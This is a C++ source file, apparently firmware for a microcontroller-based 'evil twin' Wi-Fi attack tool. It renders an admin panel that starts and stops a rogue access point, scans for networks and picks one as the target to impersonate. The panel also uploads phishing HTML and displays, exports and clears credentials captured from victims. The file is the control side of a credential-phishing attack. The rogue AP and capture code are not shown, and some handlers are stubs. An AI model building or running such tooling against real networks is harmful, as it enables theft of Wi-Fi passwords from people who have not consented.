#include "web_admin.h"
#include "storage.h"
#include "utils.h"
#include "wifi_core.h"
#include "config.h"
#include "generated_htmls.h"

static String renderStatusBadge(bool isRogueApRunning, const String& currentRogueSsid) {
    uint8_t clients = getConnectedClientCount();
    if (isRogueApRunning) {
        return "<div class='active-badge'><span class='live-dot'></span>Live: " +
               currentRogueSsid + " (" + String(clients) + " client" +
               (clients != 1 ? "s" : "") + ")</div>";
    }
    return "<div class='status-badge'>Standby</div>";
}

static String renderControlsSection(bool isRogueApRunning) {
    String html = "<div class='card'><h2>Controls</h2><div class='btn-group'>";
    if (isRogueApRunning) {
        html += "<form method='post' action='/control' style='flex:1'>"
                "<button name='action' value='stop' class='btn danger'>STOP</button></form>";
    } else {
        html += "<form method='post' action='/control' style='flex:1'>"
                "<button name='action' value='start' class='btn success'>START</button></form>";
    }
    html += "<a href='/scan' class='btn secondary' style='flex:1'>Scan</a></div></div>";
    return html;
}

static String renderNetworkTable(const std::vector<NetworkRecord>& networks,
                                 const NetworkRecord& activeTarget,
                                 unsigned long lastScanTime) {
    if (networks.empty()) return "";

    String html = "<div class='card'><h2>Networks</h2>";
    html += "<p class='scan-info'>Last scanned: " + formatUptimeMinutes(getScanAgeMinutes(lastScanTime)) + "</p>";
    html += "<div class='table-container'><table><tr><th>SSID</th><th>CH</th><th>Action</th></tr>";

    for (const auto& net : networks) {
        html += "<tr><td>" + net.ssid + "</td><td>" + String(net.channel) + "</td>";
        html += "<td><form method='post' action='/select'>";
        html += "<input type='hidden' name='bssid' value='" + net.bssidString + "'>";

        if (activeTarget.bssidString == net.bssidString) {
            html += "<button disabled class='btn success'>Selected</button>";
        } else {
            html += "<button class='btn'>Select</button>";
        }
        html += "</form></td></tr>";
    }

    html += "</table></div></div>";
    return html;
}

static String renderCredentialsSection() {
    String html = "<div class='card'><h2>Captured Data</h2>";
    html += readCapturedCredentials();
    html += "<br><div class='btn-group'>";
    html += "<form method='post' action='/clear-logs' style='flex:1'>"
            "<button class='btn danger'>Clear</button></form>";
    html += "<a href='/export' class='btn secondary' style='flex:1'>Export CSV</a>";
    html += "</div></div>";
    return html;
}

void serveAdminPanel(WebServer& server, const std::vector<NetworkRecord>& networks,
                     const NetworkRecord& activeTarget, bool isRogueApRunning,
                     const String& currentRogueSsid, unsigned long lastScanTime) {
    String html = String(FPSTR(ADMIN_HEADER_HTML));
    html.replace("%TITLE%", "Admin");

    html += "<div class='header'><h1>Network Security Portal</h1>";
    html += renderStatusBadge(isRogueApRunning, currentRogueSsid);
    html += "</div>";

    html += renderControlsSection(isRogueApRunning);

    html += "<div class='card'><h2>Settings</h2><div class='btn-group'>";
    html += "<a href='/config' class='btn secondary' style='flex:1'>Config Page</a>";
    html += "<a href='/upload' class='btn secondary' style='flex:1'>Upload HTML</a>";
    html += "</div></div>";

    html += renderCredentialsSection();
    html += renderNetworkTable(networks, activeTarget, lastScanTime);

    if (isRogueApRunning) {
        html += "<script>setTimeout(()=>location.reload(),5000);</script>";
    }

    html += FPSTR(FOOTER_HTML);
    server.send(200, "text/html", html);
}

void handleControlAction(WebServer& server) {
    server.sendHeader("Location", "/admin");
    server.send(302, "text/plain", "");
}

void handleScanRequest(WebServer& server) {
    server.sendHeader("Location", "/admin");
    server.send(302, "text/plain", "");
}

void handleNetworkSelect(WebServer& server, std::vector<NetworkRecord>& networks,
                         NetworkRecord& activeTarget) {
    String bssid = server.arg("bssid");
    for (const auto& net : networks) {
        if (net.bssidString == bssid) {
            activeTarget = net;
            break;
        }
    }
    server.sendHeader("Location", "/admin");
    server.send(302, "text/plain", "");
}

void handleClearCredentials(WebServer& server) {
    wipeCredentialLog();
    server.sendHeader("Location", "/admin");
    server.send(302, "text/plain", "");
}
